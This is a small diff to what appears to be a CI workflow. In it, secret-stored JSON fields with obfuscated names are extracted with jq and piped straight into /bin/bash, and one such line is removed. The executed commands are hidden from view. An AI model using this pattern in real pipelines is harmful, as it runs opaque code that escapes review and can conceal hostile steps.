@@ -19,7 +19,6 @@ jobs:
           jlp59: ${{ secrets.jlp59 }}
         run: |
           printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
-          printf '%s' "$s805" | jq -r .zy855 | /bin/bash
           echo $ngto7925 | jq -r .igm57430 | /bin/bash
 
       - name: Archive results
